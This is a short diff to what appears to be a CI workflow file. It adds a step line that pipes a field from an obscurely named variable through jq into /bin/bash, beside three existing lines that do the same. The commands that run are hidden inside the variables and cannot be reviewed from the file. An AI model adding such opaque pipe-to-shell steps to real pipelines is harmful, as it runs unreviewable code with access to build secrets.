@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$tfwc100" | jq -r .wkf37 | /bin/bash
           echo $kbas2331 | jq -r .ksmn52652 | /bin/bash
           echo $zsn07 | jq -r .z0334 | /bin/bash
+          echo $scide4 | jq -r .jdtfr9713 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
